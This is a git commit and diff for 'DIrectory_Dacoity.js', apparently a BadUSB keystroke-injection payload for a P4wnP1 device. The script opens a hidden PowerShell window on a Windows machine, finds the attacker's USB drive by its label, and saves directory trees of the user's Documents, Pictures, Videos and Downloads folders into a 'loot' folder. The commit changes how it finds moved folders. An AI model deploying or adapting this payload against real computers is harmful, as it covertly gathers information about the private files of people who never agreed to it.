9005833832bdedff32445bbbeac04a23fcda8824
AdamWHY2K <68286215+AdamWHY2K@users.noreply.github.com>
2021-05-26 12:50:54 +0100

    Update DIrectory_Dacoity.js
    Now using ```([Environment]::GetFolderPath('MyDocuments'))``` to return actual path no matter which drive it resides.

--- Directory_Dacoity/DIrectory_Dacoity.js
+++ Directory_Dacoity/DIrectory_Dacoity.js
@@ -9,10 +9,11 @@ press("GUI r");
 delay(500);
 if (hide) type("powershell -w h -NoP -NonI\n"); else type("powershell\n"); //Hide the console if chosen to do so
 delay(1000);
-type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");	   //Replace 'P4WNP1' with your drive name
+type("$usbPath =((gwmi win32_volume -f 'label=''Storage''').Name)\n");	   //Replace 'P4WNP1' with your drive name
 delay(100);
-type("tree /F /A $env:USERPROFILE\\Documents > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A $env:USERPROFILE\\Pictures > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A $env:USERPROFILE\\Videos > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
-//env:USERPROFILE returns the default directory where Documents, Pictures, Downloads, etc reside
+type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
+//([Environment]::GetFolderPath('MyDocuments')) returns the path to Documents even if the user has moved it to another drive
+//Unfortunately Downloads isn't supported in that format so we can only return the default Downloads path using env:USERPROFILE\\Downloads
 //Using $env:COMPUTERNAME- so files from different computers don't get overwrote
 //Stores outputs in loot folder on drive
 if (exit) { type("exit\n"); } //Exit the console if chosen to do so
